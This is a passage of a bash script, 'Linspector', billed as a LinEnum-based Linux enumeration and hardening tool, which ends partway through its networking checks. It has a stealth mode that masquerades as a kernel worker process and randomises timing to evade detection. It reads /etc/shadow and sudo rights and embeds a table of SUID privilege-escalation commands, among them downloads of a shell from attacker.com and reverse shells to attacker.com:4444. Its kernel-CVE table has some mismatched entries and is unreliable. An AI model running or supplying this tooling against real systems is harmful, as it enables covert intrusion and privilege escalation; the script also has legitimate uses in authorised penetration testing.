#!/bin/bash
#=============================================================================
#  _      _                           _             
# | |    (_)                         | |            
# | |     _ _ __  ___ _ __   ___  ___| |_ ___  _ __ 
# | |    | | '_ \/ __| '_ \ / _ \/ __| __/ _ \| '__|
# | |____| | | | \__ \ |_) |  __/ (__| || (_) | |   
# |______|_|_| |_|___/ .__/ \___|\___|\__\___/|_|   
#                    | |                            
#                    |_|                            
#
# Inspecting the Linux so you don't have to.
#=============================================================================
# Resource-optimized Linux enumeration & hardening script
# Based on original LinEnum by rebootuser
#=============================================================================
version="1.0.0"
script_name="Linspector"

#=============================================================================
# STEALTH MODE SETTINGS
#=============================================================================
# Silent mode - no banners, minimal footprint (enable with -q flag)
QUIET_MODE=0
# Hide from process list by masquerading as common process
PROC_NAME="[kworker/u:0]"
# Randomize scan timing to avoid pattern detection
RANDOM_DELAY=0

#=============================================================================
# VERSION INSPECTION SETTINGS
#=============================================================================
# Enable version inspection mode (-i flag)
INSPECT_VERSIONS=0
# Array to store discovered versions for final report
declare -A VERSION_INVENTORY

#=============================================================================
# RESOURCE OPTIMIZATION SETTINGS (Adjust these based on your server capacity)
#=============================================================================
# Delay between major scan sections (seconds) - prevents CPU spikes
SECTION_DELAY=0.3
# Delay between heavy find operations (seconds)
FIND_DELAY=0.1
# Max depth for expensive recursive searches
MAX_FIND_DEPTH=6
# Enable low-priority execution (nice/ionice) - 1=enabled, 0=disabled
LOW_PRIORITY=1
# Max results for find operations to prevent memory bloat
MAX_FIND_RESULTS=500
# Temporary file for streaming large outputs (auto-cleaned)
# Use user-specific temp directory to ensure write permissions
if [ -n "$XDG_RUNTIME_DIR" ] && [ -w "$XDG_RUNTIME_DIR" ]; then
    TEMP_DIR="$XDG_RUNTIME_DIR"
elif [ -w "/tmp" ]; then
    TEMP_DIR="/tmp"
elif [ -w "$HOME" ]; then
    TEMP_DIR="$HOME/.cache"
    mkdir -p "$TEMP_DIR" 2>/dev/null
else
    TEMP_DIR="${TMPDIR:-/tmp}"
fi
TEMP_FILE=""

#=============================================================================
# PRIVILEGE DETECTION
#=============================================================================
# Global variable to track user privilege level
IS_ROOT=0
CAN_SUDO=0
CURRENT_USER=$(whoami 2>/dev/null || echo "unknown")
CURRENT_UID=$(id -u 2>/dev/null || echo "999")

#=============================================================================
# PRIVILEGE ESCALATION CACHE (stores findings from enumeration phase)
#=============================================================================
declare -a CACHED_SUID_FILES
declare -a CACHED_SUID_BINARIES
CACHED_SUDO_OUTPUT=""
CACHED_CAPABILITIES=""
CACHED_WRITABLE_CRONS=""
CACHED_WRITABLE_SERVICES=""
IN_DOCKER_GROUP=0
IN_LXD_GROUP=0
IN_DOCKER_CONTAINER=0
CACHED_PATH="$PATH"
CACHED_KERNEL_VERSION=""

# Detect user privilege level
detect_privileges() {
    # Check if running as root
    if [ "$CURRENT_UID" = "0" ] || [ "$CURRENT_USER" = "root" ]; then
        IS_ROOT=1
        CAN_SUDO=1
        return
    fi
    
    # Check if user can sudo without password
    if sudo -n true 2>/dev/null; then
        CAN_SUDO=1
    fi
}

# Check if file/directory is readable
can_read() {
    [ -r "$1" ] 2>/dev/null
}

# Execute command only if we have privileges, otherwise show informative message
priv_exec() {
    local cmd="$1"
    local label="$2"
    
    # Try to execute the command
    if eval "$cmd" 2>/dev/null; then
        return 0
    else
        # Command failed, likely due to permissions
        if [ "$QUIET_MODE" != "1" ]; then
            echo -e "\e[00;90m[i] ${label}: Insufficient permissions (run as root for full access)\e[00m"
        fi
        return 1
    fi
}

#=============================================================================
# CLEANUP HANDLER
#=============================================================================
cleanup() {
    [ -n "$TEMP_FILE" ] && [ -f "$TEMP_FILE" ] && rm -f "$TEMP_FILE"
    # Restore original process name if changed
    [ -n "$ORIGINAL_PROC_NAME" ] && exec -a "$ORIGINAL_PROC_NAME" true 2>/dev/null
}
trap cleanup EXIT INT TERM

#=============================================================================
# STEALTH FUNCTIONS
#=============================================================================

# Disguise process name in ps/top output
disguise_process() {
    if [ "$QUIET_MODE" = "1" ]; then
        ORIGINAL_PROC_NAME="$0"
        # This changes how the process appears in ps
        exec -a "$PROC_NAME" "$SHELL" -c ":" 2>/dev/null &
    fi
}

# Add random micro-delays to avoid detection patterns
random_sleep() {
    if [ "$RANDOM_DELAY" = "1" ]; then
        sleep "0.$(( RANDOM % 5 + 1 ))"
    fi
}

# Silent output - only writes to file in quiet mode
output() {
    if [ "$QUIET_MODE" = "1" ]; then
        # In quiet mode, suppress all terminal output
        cat >> "$QUIET_OUTPUT" 2>/dev/null
    else
        cat
    fi
}

# Conditional echo - respects quiet mode
qecho() {
    if [ "$QUIET_MODE" != "1" ]; then
        echo -e "$@"
    fi
}

#=============================================================================
# VERSION EXTRACTION FUNCTIONS
#=============================================================================

# Store version in inventory for later reporting
store_version() {
    local component="$1"
    local version="$2"
    local source="$3"
    if [ -n "$version" ] && [ "$INSPECT_VERSIONS" = "1" ]; then
        VERSION_INVENTORY["$component"]="$version|$source"
    fi
}

# Extract version number from string (handles various formats)
extract_version() {
    echo "$1" | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?([-_][a-zA-Z0-9]+)?' | head -1
}

# Get kernel version
get_kernel_version() {
    local ver
    ver=$(uname -r 2>/dev/null)
    store_version "Linux Kernel" "$ver" "uname -r"
    echo "$ver"
}

# Get sudo version
get_sudo_version() {
    local ver
    # Try without invoking sudo first
    if command -v sudo >/dev/null 2>&1; then
        ver=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')
        [ -n "$ver" ] && store_version "Sudo" "$ver" "sudo -V"
    fi
    echo "$ver"
}

# Get OpenSSH version
get_ssh_version() {
    local ver
    ver=$(ssh -V 2>&1 | grep -oE 'OpenSSH_[0-9]+\.[0-9]+[a-z]*' | sed 's/OpenSSH_//')
    store_version "OpenSSH Client" "$ver" "ssh -V"
    # Also check sshd (may require root)
    if command -v sshd >/dev/null 2>&1; then
        local sshd_ver
        sshd_ver=$(sshd -V 2>&1 | grep -oE 'OpenSSH_[0-9]+\.[0-9]+[a-z]*' | sed 's/OpenSSH_//' | head -1)
        [ -n "$sshd_ver" ] && store_version "OpenSSH Server" "$sshd_ver" "sshd -V"
    fi
    echo "$ver"
}

# Get Apache version
get_apache_version() {
    local ver
    if command -v apache2 >/dev/null 2>&1; then
        ver=$(apache2 -v 2>/dev/null | grep "Server version" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    fi
    if [ -z "$ver" ] && command -v httpd >/dev/null 2>&1; then
        ver=$(httpd -v 2>/dev/null | grep "Server version" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    fi
    [ -n "$ver" ] && store_version "Apache" "$ver" "apache2/httpd -v"
    echo "$ver"
}

# Get Nginx version
get_nginx_version() {
    local ver
    if command -v nginx >/dev/null 2>&1; then
        ver=$(nginx -v 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        [ -n "$ver" ] && store_version "Nginx" "$ver" "nginx -v"
    fi
    echo "$ver"
}

# Get MySQL/MariaDB version
get_mysql_version() {
    local ver
    ver=$(mysql --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$ver" ] && store_version "MySQL/MariaDB" "$ver" "mysql --version"
    echo "$ver"
}

# Get PostgreSQL version
get_postgres_version() {
    local ver
    ver=$(psql --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    [ -n "$ver" ] && store_version "PostgreSQL" "$ver" "psql --version"
    echo "$ver"
}

# Get PHP version
get_php_version() {
    local ver
    ver=$(php -v 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "PHP" "$ver" "php -v"
    echo "$ver"
}

# Get Python versions
get_python_version() {
    local ver
    ver=$(python3 --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "Python3" "$ver" "python3 --version"
    ver=$(python --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "Python" "$ver" "python --version"
    echo "$ver"
}

# Get Node.js version
get_node_version() {
    local ver
    ver=$(node --version 2>/dev/null | tr -d 'v')
    [ -n "$ver" ] && store_version "Node.js" "$ver" "node --version"
    echo "$ver"
}

# Get Docker version
get_docker_version() {
    local ver
    ver=$(docker --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$ver" ] && store_version "Docker" "$ver" "docker --version"
    echo "$ver"
}

# Get OpenSSL version
get_openssl_version() {
    local ver
    ver=$(openssl version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?')
    [ -n "$ver" ] && store_version "OpenSSL" "$ver" "openssl version"
    echo "$ver"
}

# Get GCC version
get_gcc_version() {
    local ver
    ver=$(gcc --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "GCC" "$ver" "gcc --version"
    echo "$ver"
}

# Get Bash version
get_bash_version() {
    local ver
    ver=$(bash --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "Bash" "$ver" "bash --version"
    echo "$ver"
}

# Get cURL version
get_curl_version() {
    local ver
    ver=$(curl --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "cURL" "$ver" "curl --version"
    echo "$ver"
}

# Get wget version
get_wget_version() {
    local ver
    ver=$(wget --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?')
    [ -n "$ver" ] && store_version "Wget" "$ver" "wget --version"
    echo "$ver"
}

# Get Git version
get_git_version() {
    local ver
    ver=$(git --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "Git" "$ver" "git --version"
    echo "$ver"
}

# Get Perl version
get_perl_version() {
    local ver
    ver=$(perl -v 2>/dev/null | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | tr -d 'v')
    [ -n "$ver" ] && store_version "Perl" "$ver" "perl -v"
    echo "$ver"
}

# Get Ruby version
get_ruby_version() {
    local ver
    ver=$(ruby --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "Ruby" "$ver" "ruby --version"
    echo "$ver"
}

# Get systemd version
get_systemd_version() {
    local ver
    ver=$(systemctl --version 2>/dev/null | head -1 | grep -oE '[0-9]+')
    [ -n "$ver" ] && store_version "systemd" "$ver" "systemctl --version"
    echo "$ver"
}

# Get glibc version
get_glibc_version() {
    local ver
    ver=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+')
    [ -n "$ver" ] && store_version "glibc" "$ver" "ldd --version"
    echo "$ver"
}

# Collect all versions
collect_all_versions() {
    get_kernel_version >/dev/null
    get_sudo_version >/dev/null
    get_ssh_version >/dev/null
    get_bash_version >/dev/null
    get_openssl_version >/dev/null
    get_glibc_version >/dev/null
    get_systemd_version >/dev/null
    get_apache_version >/dev/null
    get_nginx_version >/dev/null
    get_mysql_version >/dev/null
    get_postgres_version >/dev/null
    get_php_version >/dev/null
    get_python_version >/dev/null
    get_node_version >/dev/null
    get_docker_version >/dev/null
    get_gcc_version >/dev/null
    get_curl_version >/dev/null
    get_wget_version >/dev/null
    get_git_version >/dev/null
    get_perl_version >/dev/null
    get_ruby_version >/dev/null
}

#=============================================================================
# OPTIMIZATION FUNCTIONS
#=============================================================================

# Run command with lower priority to reduce system impact
run_nice() {
    if [ "$LOW_PRIORITY" = "1" ] && command -v nice >/dev/null 2>&1; then
        if command -v ionice >/dev/null 2>&1; then
            nice -n 19 ionice -c 3 "$@" 2>/dev/null
        else
            nice -n 19 "$@" 2>/dev/null
        fi
    else
        "$@" 2>/dev/null
    fi
}

# Throttled find - limits results and uses lower priority
safe_find() {
    run_nice find "$@" 2>/dev/null | head -n "$MAX_FIND_RESULTS"
    sleep "$FIND_DELAY"
}

# Stream and print - avoids storing large outputs in memory
print_if_exists() {
    local label="$1"
    local content="$2"
    if [ -n "$content" ]; then
        echo -e "$label"
        echo "$content"
        echo ""
    fi
}

# Execute and stream - runs command and prints if output exists
exec_print() {
    local label="$1"
    shift
    local result
    result=$("$@" 2>/dev/null)
    print_if_exists "$label" "$result"
    unset result
}

# Add delay between sections
pause() {
    sleep "$SECTION_DELAY"
}

#=============================================================================
# HELP FUNCTION
#=============================================================================
usage() {
    echo ""
    echo -e "\e[00;36m  _      _                           _             \e[00m"
    echo -e "\e[00;36m | |    (_)                         | |            \e[00m"
    echo -e "\e[00;36m | |     _ _ __  ___ _ __   ___  ___| |_ ___  _ __ \e[00m"
    echo -e "\e[00;36m | |    | | '_ \/ __| '_ \ / _ \/ __| __/ _ \| '__|\e[00m"
    echo -e "\e[00;36m | |____| | | | \__ \ |_) |  __/ (__| || (_) | |   \e[00m"
    echo -e "\e[00;36m |______|_|_| |_|___/ .__/ \___|\___|\__\___/|_|   \e[00m"
    echo -e "\e[00;36m                    | |                            \e[00m"
    echo -e "\e[00;36m                    |_|                            \e[00m"
    echo ""
    echo -e "\e[00;33m      Inspecting the Linux so you don't have to.\e[00m"
    echo -e "\e[00;90m                     v$version\e[00m"
    echo ""
    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
    echo -e "\e[00;33mUSAGE:\e[00m"
    echo "  ./$script_name.sh [OPTIONS]"
    echo ""
    echo -e "\e[00;33mOPTIONS:\e[00m"
    echo "  -k <keyword>    Search for keyword in config/log files"
    echo "  -e <path>       Export location for findings"
    echo "  -r <name>       Report filename (required for -q)"
    echo "  -s              Supply password for sudo checks (INSECURE)"
    echo "  -t              Enable thorough/deep scan mode"
    echo "  -f              Fast mode (skip delays - use with caution)"
    echo "  -q              Quiet/Stealth mode (no output, writes to report only)"
    echo "  -i              Inspect versions (adds version inventory to report)"
    echo "  -h              Display this help message"
    echo ""
    echo -e "\e[00;33mEXAMPLES:\e[00m"
    echo "  ./$script_name.sh                    # Basic scan"
    echo "  ./$script_name.sh -t                 # Thorough scan"
    echo "  ./$script_name.sh -i -r report       # Scan with version inventory"
    echo "  ./$script_name.sh -q -i -r /root/.audit  # Silent + versions"
    echo ""
    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
}

#=============================================================================
# HEADER
#=============================================================================
header() {
    if [ "$QUIET_MODE" = "1" ]; then
        return  # Skip banner in quiet mode
    fi
    clear
    echo ""
    echo -e "\e[00;36m  _      _                           _             \e[00m"
    echo -e "\e[00;36m | |    (_)                         | |            \e[00m"
    echo -e "\e[00;36m | |     _ _ __  ___ _ __   ___  ___| |_ ___  _ __ \e[00m"
    echo -e "\e[00;36m | |    | | '_ \/ __| '_ \ / _ \/ __| __/ _ \| '__|\e[00m"
    echo -e "\e[00;36m | |____| | | | \__ \ |_) |  __/ (__| || (_) | |   \e[00m"
    echo -e "\e[00;36m |______|_|_| |_|___/ .__/ \___|\___|\__\___/|_|   \e[00m"
    echo -e "\e[00;36m                    | |                            \e[00m"
    echo -e "\e[00;36m                    |_|                            \e[00m"
    echo ""
    echo -e "\e[00;33m      Inspecting the Linux so you don't have to.\e[00m"
    echo -e "\e[00;90m                     v$version\e[00m"
    echo ""
    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
}

#=============================================================================
# DEBUG INFO
#=============================================================================
debug_info() {
    if [ "$QUIET_MODE" = "1" ]; then
        # Minimal header for stealth mode
        echo "=== LINSPECTOR AUDIT ==="
        echo "Date: $(date)"
        echo "Host: $(hostname)"
        echo "User: $(whoami)"
        echo ""
        return
    fi
    
    echo "[-] Debug Info"
    
    [ "$keyword" ] && echo "[+] Searching for keyword: $keyword"
    [ "$report" ] && echo "[+] Report name: $report"
    [ "$export" ] && echo "[+] Export location: $export"
    
    if [ "$thorough" ]; then
        echo "[+] Thorough tests: Enabled"
    else
        echo -e "\e[00;33m[+] Thorough tests: Disabled\e[00m"
    fi
    
    echo "[+] Resource optimization: Enabled (delays: ${SECTION_DELAY}s/${FIND_DELAY}s)"
    echo "[+] Running as user: $CURRENT_USER (UID: $CURRENT_UID)"
    if [ "$IS_ROOT" = "1" ]; then
        echo -e "\e[00;32m[+] Privilege level: ROOT (full access)\e[00m"
    elif [ "$CAN_SUDO" = "1" ]; then
        echo -e "\e[00;33m[+] Privilege level: CAN SUDO (elevated access available)\e[00m"
    else
        echo -e "\e[00;90m[+] Privilege level: UNPRIVILEGED (limited access - some checks will be skipped)\e[00m"
    fi
    
    sleep 1
    
    if [ "$export" ]; then
        mkdir -p "$export" 2>/dev/null
        format="$export/LinEnum-export-$(date +"%d-%m-%y")"
        mkdir -p "$format" 2>/dev/null
    fi
    
    if [ "$sudopass" ]; then
        echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
        read -rs userpassword
        echo
    fi
    
    echo -e "\n\e[00;33mScan started at: $(date)\e[00m\n"
}

#=============================================================================
# BINARY LIST FOR GTFO CHECKS
#=============================================================================
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

#=============================================================================
# PRIVILEGE ESCALATION EXPLOIT DATABASES
#=============================================================================

# Expanded GTFOBins database - 50+ exploitable binaries
declare -A GTFO_SUID_EXPLOITS
GTFO_SUID_EXPLOITS=(
    ["find"]="find . -exec /bin/sh -p \\; -quit"
    ["vim"]="vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ["vi"]="vi -c ':!sh -p' -c ':q'"
    ["nmap"]="nmap --interactive\\nnmap> !sh -p"
    ["awk"]="awk 'BEGIN {system(\"/bin/sh -p")}'"
    ["perl"]="perl -e 'exec \"/bin/sh\";'"
    ["python"]="python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ["python3"]="python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ["ruby"]="ruby -e 'exec \"/bin/sh -p\"'"
    ["less"]="less /etc/profile\\n!/bin/sh -p"
    ["more"]="more /etc/profile\\n!/bin/sh -p"
    ["nano"]="nano\\n^R^X\\nreset; sh -p 1>&0 2>&0"
    ["cp"]="cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"
    ["mv"]="mv /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"
    ["tar"]="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ["zip"]="zip /tmp/x /etc/hosts -T -TT 'sh -p'"
    ["git"]="git help config\\n!/bin/sh -p"
    ["docker"]="docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ["env"]="env /bin/sh -p"
    ["ed"]="ed\\n!/bin/sh -p"
    ["node"]="node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'"
    ["bash"]="bash -p"
    ["sh"]="sh -p"
    ["dash"]="dash -p"
    ["php"]="php -r 'system(\"/bin/sh -p\");'"
    ["wget"]="wget http://attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell"
    ["curl"]="curl http://attacker.com/shell -o /tmp/shell && chmod +x /tmp/shell"
    ["nc"]="nc -e /bin/sh -p attacker.com 4444"
    ["netcat"]="netcat -e /bin/sh -p attacker.com 4444"
    ["socat"]="socat exec:'sh -p',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444"
    ["ssh"]="ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x"
    ["man"]="man man\\n!/bin/sh -p"
    ["expect"]="expect -c 'spawn /bin/sh -p;interact'"
    ["ftp"]="ftp\\n!/bin/sh -p"
    ["gdb"]="gdb -nx -ex '!sh -p' -ex quit"
    ["lua"]="lua -e 'os.execute(\"/bin/sh -p\")'"
    ["irb"]="irb\\nexec '/bin/sh -p'"
    ["mysql"]="mysql -e '\\\\! /bin/sh -p'"
    ["psql"]="psql -c '\\\\! /bin/sh -p'"
    ["make"]="make -s --eval=$'x:\\n\\t-'/bin/sh -p'"
    ["systemctl"]="systemctl enable ../../tmp/shell.service"
    ["screen"]="screen -D -m /bin/sh -p"
    ["tmux"]="tmux new-session -d /bin/sh -p"
    ["strace"]="strace -o /dev/null /bin/sh -p"
    ["taskset"]="taskset 1 /bin/sh -p"
    ["time"]="time /bin/sh -p"
    ["timeout"]="timeout 7d /bin/sh -p"
    ["watch"]="watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
    ["xargs"]="xargs -a /dev/null sh -p"
    ["sed"]="sed -n '1e exec sh -p' /etc/hosts"
    ["grep"]="grep '' /etc/passwd -m 1 -o -a -h -r --line-buffered --binary-files=text -D skip | sh -p"
    ["rvim"]="rvim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ["emacs"]="emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
    ["gimp"]="gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
)

# Kernel exploit database - 18 major CVEs
declare -A KERNEL_EXPLOITS
KERNEL_EXPLOITS=(
    ["2.6.22"]="Vmsplice|CVE-2008-0600"
    ["2.6.32"]="DirtyCOW|CVE-2016-5195"
    ["2.6.37"]="Full-Nelson|CVE-2010-4258"
    ["3.2"]="Memodipper|CVE-2012-0056"
    ["3.8"]="Perf_swevent|CVE-2013-2094"
    ["3.13"]="OverlayFS|CVE-2015-1328"
    ["3.14"]="OverlayFS|CVE-2015-8660"
    ["4.4"]="AF_PACKET|CVE-2016-8655"
    ["4.8"]="get_rekt|CVE-2017-16995"
    ["4.10"]="packet_set_ring|CVE-2017-7308"
    ["4.13"]="eBPF|CVE-2017-16995"
    ["4.15"]="KASLR/SMEP|CVE-2017-5123"
    ["5.8"]="OverlayFS|CVE-2021-3493"
    ["5.11"]="Netfilter|CVE-2021-22555"
    ["5.13"]="SequoiaFS|CVE-2021-33909"
    ["3.16"]="eBPF_verifier|CVE-2017-16995"
    ["1.3.0"]="PwnKit|CVE-2021-4034"
    ["5.10"]="DirtyPipe|CVE-2022-0847"
)

#=============================================================================
# SYSTEM INFO
#=============================================================================
system_info() {
    echo -e "\e[00;33m### SYSTEM ##############################################\e[00m"
    
    exec_print "\e[00;31m[-] Kernel information:\e[00m" uname -a
    exec_print "\e[00;31m[-] Kernel information (continued):\e[00m" cat /proc/version
    exec_print "\e[00;31m[-] Specific release information:\e[00m" cat /etc/*-release
    exec_print "\e[00;31m[-] Hostname:\e[00m" hostname
    
    # Cache kernel version for privesc analysis
    CACHED_KERNEL_VERSION=$(uname -r 2>/dev/null)
    
    pause
}

#=============================================================================
# USER INFO
#=============================================================================
user_info() {
    echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m"
    
    exec_print "\e[00;31m[-] Current user/group info:\e[00m" id
    exec_print "\e[00;31m[-] Users that have previously logged onto the system:\e[00m" sh -c "lastlog 2>/dev/null | grep -v 'Never'"
    exec_print "\e[00;31m[-] Who else is logged on:\e[00m" w
    
    # Optimized group info - process in chunks to save memory
    echo -e "\e[00;31m[-] Group memberships:\e[00m"
    cut -d":" -f1 /etc/passwd 2>/dev/null | while read -r user; do
        id "$user" 2>/dev/null
    done
    echo ""
    
    # Check for password hashes in /etc/passwd
    local hashesinpasswd
    hashesinpasswd=$(grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null)
    if [ -n "$hashesinpasswd" ]; then
        echo -e "\e[00;33m[+] Password hashes in /etc/passwd!\e[00m"
        echo "$hashesinpasswd"
        echo ""
    fi
    
    exec_print "\e[00;31m[-] Contents of /etc/passwd:\e[00m" cat /etc/passwd
    
    # Shadow file check
    if can_read /etc/shadow; then
        echo -e "\e[00;33m[+] We can read the shadow file!\e[00m"
        cat /etc/shadow 2>/dev/null
        echo ""
    elif [ "$QUIET_MODE" != "1" ]; then
        echo -e "\e[00;90m[i] Cannot read /etc/shadow (requires root privileges)\e[00m"
        echo ""
    fi
    
    # Root accounts
    exec_print "\e[00;31m[-] Super user account(s):\e[00m" sh -c "grep -v -E '^#' /etc/passwd 2>/dev/null | awk -F: '\$3 == 0 { print \$1}'"
    
    # Sudoers
    if can_read /etc/sudoers; then
        exec_print "\e[00;31m[-] Sudoers configuration (condensed):\e[00m" sh -c "grep -v -e '^$' /etc/sudoers 2>/dev/null | grep -v '#'"
    elif [ "$QUIET_MODE" != "1" ]; then
        echo -e "\e[00;90m[i] Cannot read /etc/sudoers (requires root privileges)\e[00m"
        echo ""
    fi
    
    # Sudo without password
    if command -v sudo >/dev/null 2>&1; then
        local sudoperms
        sudoperms=$(echo '' | sudo -S -l -k 2>/dev/null)
        if [ -n "$sudoperms" ]; then
            echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m"
            echo "$sudoperms"
            echo ""
            # Cache for privesc analysis
            CACHED_SUDO_OUTPUT="$sudoperms"
        fi
    fi
    
    # SUID sudo binaries
    local sudopwnage
    sudopwnage=$(echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w "$binarylist" 2>/dev/null)
    print_if_exists "\e[00;33m[+] Possible sudo pwnage!\e[00m" "$sudopwnage"
    
    # SSH root login
    local sshrootlogin
    sshrootlogin=$(grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print $2}')
    if [ "$sshrootlogin" = "yes" ]; then
        echo -e "\e[00;31m[-] Root is allowed to login via SSH\e[00m"
        grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#"
        echo ""
    fi
    
    # Home directory permissions
    exec_print "\e[00;31m[-] Home directory permissions:\e[00m" ls -ahl /home/
    
    # Root home directory
    if can_read /root/; then
        echo -e "\e[00;33m[+] We can read root's home directory!\e[00m"
        ls -ahl /root/ 2>/dev/null
        echo ""
    elif [ "$QUIET_MODE" != "1" ]; then
        echo -e "\e[00;90m[i] Cannot read /root/ directory (requires root privileges)\e[00m"
        echo ""
    fi
    
    pause
}

#=============================================================================
# ENVIRONMENTAL INFO
#=============================================================================
environmental_info() {
    echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m"
    
    exec_print "\e[00;31m[-] Environment information:\e[00m" sh -c "env 2>/dev/null | grep -v 'LS_COLORS'"
    exec_print "\e[00;31m[-] SELinux status:\e[00m" sestatus
    exec_print "\e[00;31m[-] Path information:\e[00m" sh -c "echo \$PATH"
    exec_print "\e[00;31m[-] Available shells:\e[00m" cat /etc/shells
    exec_print "\e[00;31m[-] Current umask value:\e[00m" sh -c "umask -S 2>/dev/null; umask 2>/dev/null"
    exec_print "\e[00;31m[-] Password policy:\e[00m" sh -c "grep '^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null"
    
    pause
}

#=============================================================================
# JOB INFO
#=============================================================================
job_info() {
    echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m"
    
    exec_print "\e[00;31m[-] Cron jobs:\e[00m" ls -la /etc/cron*
    exec_print "\e[00;31m[-] Crontab contents:\e[00m" cat /etc/crontab
    
    # World-writable cron jobs (limited search)
    local cronjobwwperms
    cronjobwwperms=$(safe_find /etc/cron* -perm -0002 -type f -exec ls -la {} \; 2>/dev/null)
    print_if_exists "\e[00;33m[+] World-writable cron jobs:\e[00m" "$cronjobwwperms"
    # Cache for privesc analysis
    [ -n "$cronjobwwperms" ] && CACHED_WRITABLE_CRONS="$cronjobwwperms"
    
    exec_print "\e[00;31m[-] Anacron jobs:\e[00m" sh -c "ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null"
    
    # Systemd timers
    if [ "$thorough" = "1" ]; then
        exec_print "\e[00;31m[-] Systemd timers (all):\e[00m" systemctl list-timers --all
    else
        exec_print "\e[00;31m[-] Systemd timers:\e[00m" sh -c "systemctl list-timers 2>/dev/null | head -n -1"
    fi
    
    pause
}

#=============================================================================
# NETWORKING INFO
#=============================================================================
networking_info() {
    echo -e "\e[00;33m### NETWORKING ##########################################\e[00m"
    
    # Network info - try ifconfig first, then ip
    local nicinfo
    nicinfo=$(/sbin/ifconfig -a 2>/dev/null)
    if [ -z "$nicinfo" ]; then
        nicinfo=$(/sbin/ip a 2>/dev/null)
    fi
